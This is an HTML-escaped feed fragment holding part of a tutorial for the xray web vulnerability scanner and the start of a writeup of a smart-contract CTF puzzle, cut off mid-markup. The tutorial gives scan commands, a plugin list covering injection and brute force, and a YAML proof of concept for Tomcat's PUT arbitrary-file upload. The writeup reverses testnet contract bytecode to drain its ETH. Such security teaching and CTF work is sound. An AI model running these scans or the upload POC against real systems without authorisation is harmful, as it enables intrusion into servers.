ca.crt      ca.key      config.yaml xray&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;高级姿势&lt;/h2&gt;&lt;h3&gt;指定扫描插件&lt;/h3&gt;&lt;p&gt;使用 &lt;code&gt;--plugins&lt;/code&gt; 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./xray webscan --plugins cmd_injection --url http://example.com/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;目前提供的插件列表如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;SQL 注入检测 (key: sqldet)&lt;br/&gt;支持报错注入、布尔注入和时间盲注等&lt;/li&gt;&lt;li&gt;XSS 检测（key: xss）&lt;br/&gt;支持扫描反射型、存储型 XSS&lt;/li&gt;&lt;li&gt;命令/代码注入检测 (key: cmd_injection)&lt;br/&gt;支持 shell 命令注入、PHP 代码执行、模板注入等&lt;/li&gt;&lt;li&gt;目录枚举 (key: dirscan)&lt;br/&gt;检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件&lt;/li&gt;&lt;li&gt;路径穿越检测 (key: path_traversal)&lt;br/&gt;支持常见平台和编码&lt;/li&gt;&lt;li&gt;XML 实体注入检测 (key: xxe)&lt;br/&gt;支持有回显和反连平台检测&lt;/li&gt;&lt;li&gt;POC 管理 (key: phantasm)&lt;br/&gt;默认内置部分常用的 POC，用户可以根据需要自行构建 POC 并运行。可参考：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chaitin.github.io/xray/%23/guide/poc&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;POC 编写文档&lt;/a&gt;&lt;/li&gt;&lt;li&gt;文件上传检测 (key: upload)&lt;br/&gt;支持检测常见的后端服务器语言的上传漏洞&lt;/li&gt;&lt;li&gt;弱口令检测 (key: brute_force)&lt;br/&gt;支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典&lt;/li&gt;&lt;li&gt;JSONP 检测 (key: jsonp)&lt;br/&gt;检测包含敏感信息可以被跨域读取的 jsonp 接口&lt;/li&gt;&lt;li&gt;SSRF 检测 (key: ssrf)&lt;br/&gt;ssrf 检测模块，支持常见的绕过技术和反连平台检测&lt;/li&gt;&lt;li&gt;基线检查 (key: baseline)&lt;br/&gt;检测低 SSL 版本、缺失的或错误添加的 http 头等&lt;/li&gt;&lt;li&gt;任意跳转检测 (key: redirect)&lt;br/&gt;支持 HTML meta 跳转、30x 跳转等&lt;/li&gt;&lt;li&gt;CRLF 注入 (key: crlf_injection)&lt;br/&gt;检测 HTTP 头注入，支持 query、body 等位置的参数&lt;/li&gt;&lt;li&gt;…&lt;/li&gt;&lt;/ul&gt;&lt;h3&gt;只扫描一个 URL&lt;/h3&gt;&lt;p&gt;xray 还提供了方便的只扫描一个 URL 的方式，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./xray webscan --url http://example.com/ --json-output out.json&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;配置文件&lt;/h3&gt;&lt;p&gt;xray 还提供了友好配置文件，可以方便地将常用的命令行参数写到配置文件中，避免了每次都要输入一大串参数的痛苦。&lt;/p&gt;&lt;p&gt;xray 默认会读取运行目录下的 config.yaml 文件作为配置危机，也可以使用 &lt;code&gt;--config&lt;/code&gt; 参数指定其他配置文件。&lt;/p&gt;&lt;p&gt;关于命令行的详细配置可以参考 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//chaitin.github.io/xray/%23/guide/config&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;xray 官方文档&lt;/a&gt;。&lt;/p&gt;&lt;h3&gt;反连平台&lt;/h3&gt;&lt;p&gt;xray 在运行时会自动启动反连平台来辅助盲打扫描，可以在配置文件中修改反连平台的配置。目前支持 http 和 dns 两种反连机制，当服务端触发 payload 时 xray 会根据反连平台的状态判断漏洞是否存在。&lt;/p&gt;&lt;blockquote&gt;dns 反连需要启用 root 权限监听 53 端口，并且将域名的 ns 记录指向反连平台的监听地址&lt;/blockquote&gt;&lt;h3&gt;自定义 POC&lt;/h3&gt;&lt;p&gt;xray 支持用户使用 YAML 编写 POC。YAML 是JSON 的超集，也就是说我们甚至可以用 JSON 编写 POC，但这里还是建议大家使用 YAML 来编写，原因如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;YAML 格式的 “值” 无需使用双引号包裹，特殊字符无需转义&lt;/li&gt;&lt;li&gt;YAML 格式使内容更加可读&lt;/li&gt;&lt;li&gt;YAML 中可以使用注释&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;我们可以编写以下的 yaml 来测试 tomcat put 上传任意文件漏洞：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;name: poc-yaml-tomcat_put
rules:
  - method: PUT
    path: /hello.jsp
    body: world
  - method: GET
    path: /hello.jsp
    search: world&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里还要感谢 phith0n 贡献的 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//phith0n.github.io/xray-poc-generation/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;xray PoC 生成器&lt;/a&gt;，虽然丑陋，但不失文雅。&lt;/p&gt;&lt;p&gt;将 POC 保存到 YAML 文件后使用 &lt;code&gt;--poc&lt;/code&gt; 参数可以方便地调用，如：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./xray webscan --plugins phantasm --poc /home/test/poc.yaml --url http://example.com/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;关于 xray&lt;/h2&gt;&lt;p&gt;xray 是个公益性项目，不走商业化路线，旨在分析我们的研究成果，吸收社区大佬的经验，虚心接受批评和指责，无限制、不收费，也欢迎企业用户包装使用，希望大家支持。&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/chaitin/xray&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/chaitin/xray&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt; （求 star）&lt;/p&gt;</description>
<author>长小亭</author>
<guid isPermaLink="false">2019-08-14-78132359</guid>
<pubDate>Wed, 14 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>DVP 解谜游戏 Writeup | Smart Contract Puzzle</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2019-08-05-76722414.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/76722414&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8cae571d19e2a74081325f0997a4e0c0_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;本文作者：&lt;b&gt;Mir4c1e&lt;/b&gt;，长亭科技区块链安全研究员&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;编者按：&lt;/b&gt;&lt;br/&gt;日前，DVP 去中心化漏洞平台（全称 Decentralized Vulnerability Platform）开启“区块链安全进化论”周年庆典活动，发布“三重礼”线上安全解题挑战活动。&lt;br/&gt;7月23日，经过近40个小时激烈角逐，“二重礼”解谜游戏第二项挑战被长亭科技的大佬“Mir4c1e”和“BubbLess”联手攻克，赢得8ETH的大奖。&lt;br/&gt;小编特邀 Mir4c1e 大佬现身说法，智能合约拼图解题逻辑走一波，快来前排围观。&lt;/blockquote&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;1. 题名：&lt;/b&gt;Deadend&lt;/p&gt;&lt;p&gt;&lt;b&gt;2.挑战类型：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;此项挑战为智能合约相关，适合广大区块链开发者。&lt;/p&gt;&lt;p&gt;&lt;b&gt;3. 挑战规则：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;参赛者需取走合约内所有余额，并使用解题所用的钱包地址对“dvpisbest”签名，然后将签名后的信息以漏洞方式提交到DVP平台，并附带解题思路。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;一、理解题意&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;打开题目链接 (&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//challenge2.dvpnet.io/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;challenge2.dvpnet.io/&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;)，看到给出了合约地址(&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//ropsten.etherscan.io/address/0xb3597869fbf0cc3c415f955deeedfbe0c7143259&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;ropsten.etherscan.io/ad&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;dress/0xb3597869fbf0cc3c415f955deeedfbe0c7143259&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;)与如下源码：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ae798d275a4d77b756f8e5168ed306c4_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;618&quot; data-rawheight=&quot;449&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;618&quot; data-original=&quot;https://pic1.zhimg.com/v2-ae798d275a4d77b756f8e5168ed306c4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-ae798d275a4d77b756f8e5168ed306c4_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;618&quot; data-rawheight=&quot;449&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;618&quot; data-original=&quot;https://pic1.zhimg.com/v2-ae798d275a4d77b756f8e5168ed306c4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-ae798d275a4d77b756f8e5168ed306c4_b.jpg&quot;/&gt;&lt;figcaption&gt;图：题目页面部分截图&lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;从给出的源码里注意到 constructor 里有 assembly 片段，且最后提前进行了 return 操作，因此得知题目一定是替换了链上真实的字节码，而源码应仅供参考。断定此题是个 Honeypot Contract。另外合约地址上有一个 ETH ，因此目标就是转走这个 ETH 。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3882dc14c804fb282df2c8b85afa8500_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;585&quot; data-rawheight=&quot;215&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;585&quot; data-original=&quot;https://pic1.zhimg.com/v2-3882dc14c804fb282df2c8b85afa8500_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3882dc14c804fb282df2c8b85afa8500_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;585&quot; data-rawheight=&quot;215&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;585&quot; data-original=&quot;https://pic1.zhimg.com/v2-3882dc14c804fb282df2c8b85afa8500_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-3882dc14c804fb282df2c8b85afa8500_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;由 solidity 中 bytes 的编码格式可知，add(0x20,b)是实际数据的开始， mload(b) 返回的是 (bytes)b 最前面 32 字节内容，即 len(b) 。&lt;/p&gt;&lt;p&gt;由此知，实际链上字节码是传入的参数 b 。&lt;/p&gt;&lt;p&gt;于是查看[合约的部署交易]（&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//ropsten.etherscan.io/tx/0xfb1a05122ebd80cc0828e1906c59e43890e9a7e323de9f63eefa88f33a08503d&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;ropsten.etherscan.io/tx&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;/0xfb1a05122ebd80cc0828e1906c59e43890e9a7e323de9f63eefa88f33a08503d&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;)，把 input 里的 b 拿出来逆向即可：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;0x608060405260405161002338038061002383398101604052805101805160208201f300000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000006706080604052600436106100565763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416632d1d744a811461006c......90fd5b92915050560000000000000000000000000000000000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;&lt;i&gt;0xf300 通常是 creation code 的结束标志，后面是完整的 b，0x670 是 b 的长度，可知后面几乎都是 b 的实际内容（除去末尾的 0 们）。（通常在 creation code 和参数间是 runtime code ，但由于提前 return ，且出题人编译时应该开启了 optimization ，所以此段省略了，这种方式可以避免由于调换 runtime code 导致 input 过长。&lt;/i&gt;&lt;/blockquote&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;废话说多了。&lt;/p&gt;&lt;p&gt;既然题目目的是获得合约 ETH ，一定需要转账功能，于是反汇编搜了一下 call 字节码，看到在 0x05eb 有一个，跟前后汇编操作加一起是 msg.sender.transfer(address(this).balance)，所以只需要调用合约走到这里就好了。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;二、逆向&lt;/h2&gt;&lt;p&gt;一开始感觉核心是猜数字的算法，但大概看了一下没有把算法搞得很清楚。于是拿源码作参考，拿头逆了一下，理解了代码逻辑。&lt;/p&gt;&lt;p&gt;函数只有 isPass，show_hand，0xd5a7f198 三个，前两个看了一下还好，第三个逻辑最复杂于是重点关照。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cd8bc23bbd1ead67839849806db32780_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;535&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-cd8bc23bbd1ead67839849806db32780_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cd8bc23bbd1ead67839849806db32780_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;535&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-cd8bc23bbd1ead67839849806db32780_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-cd8bc23bbd1ead67839849806db32780_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;先看到要求 msg.sender 末尾字节是 0x11 ，否则 revert ，套路 match 。&lt;/p&gt;&lt;p&gt;由于当时是用合约调用测试的，方便起见先 patch 了一下字节码过去这里。把 0x14 eq 换成了 0x17 or 。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5f18ece3950b0a570cbd71e3a24f49a9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;520&quot; data-rawheight=&quot;395&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;520&quot; data-original=&quot;https://pic2.zhimg.com/v2-5f18ece3950b0a570cbd71e3a24f49a9_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5f18ece3950b0a570cbd71e3a24f49a9_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;520&quot; data-rawheight=&quot;395&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;520&quot; data-original=&quot;https://pic2.zhimg.com/v2-5f18ece3950b0a570cbd71e3a24f49a9_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-5f18ece3950b0a570cbd71e3a24f49a9_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;​接下来不难发现有一个循环：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-87a3a3b6d7cbb89d61d88634f89a0eef_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;318&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;725&quot; data-original=&quot;https://pic4.zhimg.com/v2-87a3a3b6d7cbb89d61d88634f89a0eef_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-87a3a3b6d7cbb89d61d88634f89a0eef_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;318&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;725&quot; data-original=&quot;https://pic4.zhimg.com/v2-87a3a3b6d7cbb89d61d88634f89a0eef_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-87a3a3b6d7cbb89d61d88634f89a0eef_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt; var8 是 i，经 0x14 次循环后跳出，在这之前如果 var8&amp;amp;0xff &amp;gt;= 某数就跪了，然后每次循环时 var5 左移 2 字节再加上一个表达式的结果。&lt;/p&gt;&lt;p&gt;看一下 label_02db :&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-814093dd5536e3c7d60aae40c7d272d2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;666&quot; data-rawheight=&quot;156&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;666&quot; data-original=&quot;https://pic3.zhimg.com/v2-814093dd5536e3c7d60aae40c7d272d2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-814093dd5536e3c7d60aae40c7d272d2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;666&quot; data-rawheight=&quot;156&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;666&quot; data-original=&quot;https://pic3.zhimg.com/v2-814093dd5536e3c7d60aae40c7d272d2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-814093dd5536e3c7d60aae40c7d272d2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;可知var5需要等于msg.sender，否则revert，所以只要看出来循环里的算法就好了，这里可以直接逆也可以调试探索。&lt;/p&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;三、调试&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;既然前面知道了 b 值，可以在 remix 里模拟部署调试，顺带打上 patch 。&lt;/p&gt;&lt;p&gt;二话不说先传一堆数进去瞅瞅：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;target.call.value(0).gas(0x10000000)(0xd5a7f198, 0x41, 0x42, 0x43, 0x44,0x45,0x46,0x47,0x48,0x49);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;探索了一下发现，参数处理阶段有这样逻辑：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8db8027b17ae4d5de4600633574e6c91_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;743&quot; data-rawheight=&quot;356&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;743&quot; data-original=&quot;https://pic2.zhimg.com/v2-8db8027b17ae4d5de4600633574e6c91_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8db8027b17ae4d5de4600633574e6c91_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;743&quot; data-rawheight=&quot;356&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;743&quot; data-original=&quot;https://pic2.zhimg.com/v2-8db8027b17ae4d5de4600633574e6c91_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-8db8027b17ae4d5de4600633574e6c91_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1d1b6d6ad47d132597aa2ddc8391a758_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;283&quot; data-rawheight=&quot;550&quot; class=&quot;content_image&quot; width=&quot;283&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1d1b6d6ad47d132597aa2ddc8391a758_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;283&quot; data-rawheight=&quot;550&quot; class=&quot;content_image lazy&quot; width=&quot;283&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-1d1b6d6ad47d132597aa2ddc8391a758_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;（之类的&lt;/p&gt;&lt;p&gt;等价于：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-33d5eeb33e488c554e8c4b23367dfd22_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;629&quot; data-rawheight=&quot;81&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;629&quot; data-original=&quot;https://pic3.zhimg.com/v2-33d5eeb33e488c554e8c4b23367dfd22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-33d5eeb33e488c554e8c4b23367dfd22_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;629&quot; data-rawheight=&quot;81&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;629&quot; data-original=&quot;https://pic3.zhimg.com/v2-33d5eeb33e488c554e8c4b23367dfd22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-33d5eeb33e488c554e8c4b23367dfd22_b.png&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;因为数据随便传的， tmp 此时是 0x4300 。&lt;/p&gt;&lt;p&gt;继续调试，先走过之前打的 patch ：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-75e7c0c3024c32e726c71fa2a99faecb_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;358&quot; data-rawheight=&quot;150&quot; class=&quot;content_image&quot; width=&quot;358&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-75e7c0c3024c32e726c71fa2a99faecb_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;358&quot; data-rawheight=&quot;150&quot; class=&quot;content_image lazy&quot; width=&quot;358&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-75e7c0c3024c32e726c71fa2a99faecb_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;之后发现已经进入了 var8&amp;lt;0x14 循环里，到了之前说的如果小于某个数就会 assert 跪掉那里，看一下此时：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-badca1fd2e7a3394fcf06444d2adec90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;343&quot; data-rawheight=&quot;725&quot; class=&quot;content_image&quot; width=&quot;343&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-badca1fd2e7a3394fcf06444d2adec90_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;343&quot; data-rawheight=&quot;725&quot; class=&quot;content_image lazy&quot; width=&quot;343&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-badca1fd2e7a3394fcf06444d2adec90_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;了解到是 tmp 之前存到了 memory ，这里又读出来，所以只要 tmp&amp;gt;=0x14 就可以。&lt;/p&gt;&lt;p&gt;继续分析，容易看出循环中是把 memory[0xa0] 取出来，然后从最高位开始每次取1字节，与相邻前字节 xor ，右拼接到结果（即 var5）中，经过 0x14==20 次后刚好是地址长度，再跟 msg.sender 比对，一致则通过。&lt;/p&gt;&lt;p&gt;于是简单计算一下：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9ba8e1b8fdf8c7c499918de36ff36b2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;672&quot; data-rawheight=&quot;203&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;672&quot; data-original=&quot;https://pic3.zhimg.com/v2-f9ba8e1b8fdf8c7c499918de36ff36b2_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9ba8e1b8fdf8c7c499918de36ff36b2_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;672&quot; data-rawheight=&quot;203&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;672&quot; data-original=&quot;https://pic3.zhimg.com/v2-f9ba8e1b8fdf8c7c499918de36ff36b2_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-f9ba8e1b8fdf8c7c499918de36ff36b2_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;修改一下传参：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-155d0a32d98fae9ce6994fb4e3b21272_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;879&quot; data-rawheight=&quot;93&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;879&quot; data-original=&quot;https://pic3.zhimg.com/v2-155d0a32d98fae9ce6994fb4e3b21272_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-155d0a32d98fae9ce6994fb4e3b21272_b.png&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;879&quot; data-rawheight=&quot;93&quot; class=&quot;origin_image 